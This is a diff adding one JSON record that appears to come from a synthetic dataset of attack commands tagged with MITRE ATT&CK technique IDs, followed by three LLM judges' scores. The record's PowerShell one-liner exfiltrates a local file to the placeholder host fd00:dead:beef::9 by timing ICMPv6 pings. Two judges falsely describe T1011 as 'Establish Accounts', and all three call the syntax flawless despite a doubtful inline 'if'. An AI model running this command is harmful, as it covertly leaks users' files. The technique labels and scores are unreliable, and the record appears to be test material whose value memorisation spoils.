@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$d='fd00:dead:beef::9'; $bytes=[IO.File]::ReadAllBytes('C:\\Users\\Public\\notes.txt'); foreach($b in $bytes){ $bits=[Convert]::ToString($b,2).PadLeft(8,'0'); foreach($bit in $bits.ToCharArray()){ Test-Connection -ComputerName $d -Count 1 -BufferSize 256 -IPv6 -Quiet | Out-Null; Start-Sleep -Milliseconds (if($bit -eq '1'){750}else{250}) } }",
+  "explanation": "Uses a timing covert channel over ICMPv6: uniform payload echos are spaced with distinct delays to represent bit values, aligning with T1011.",
+  "rationale_steps": [
+    "Convert bytes to bit strings.",
+    "Send a constant-size ICMPv6 echo per bit.",
+    "Delay intervals encode 0/1 so a receiver can reconstruct data by observing arrival timing."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-f38205c7-1ebf45c5",
+  "source_prompt_hash": "f38205c7",
+  "timestamp_utc": "2025-09-30T08:38:57.416507Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly well-formed with proper variable declarations, balanced parentheses/braces, correct method calls, and appropriate operators throughout the entire command sequence.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command does implement a covert channel using timing between ICMPv6 packets, it aligns with T1095 (Non-Application Layer Protocol) rather than T1011 (Exfiltration Over Other Network Medium) as it's using standard network protocols in an unusual way for data exfiltration.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T10:29:39.442529Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly well-formed with balanced syntax, valid cmdlet usage, correct parameter formatting, and proper flow control.",
+        "semantic_score": 1,
+        "semantic_justification": "While the command effectively implements a timing covert channel for data exfiltration, this activity is entirely unrelated to the MITRE ATT&CK technique T1011 (Establish Accounts), rendering the claim of alignment semantically incorrect.",
+        "combined_score": 3.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T10:29:47.224434Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed PowerShell with balanced quotes/braces, valid parameters, and correct foreach/if constructs.",
+        "semantic_score": 1,
+        "semantic_justification": "Implements a timing-based ICMPv6 covert exfiltration of file bits, which is not aligned with the described Establish Accounts technique.",
+        "combined_score": 3.0,
+        "confidence": 0.86,
+        "timestamp": "2025-10-02T10:30:32.075507Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 1.667,
+    "llm_average_score": 3.333,
+    "llm_verdict": "likely_mismatch",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
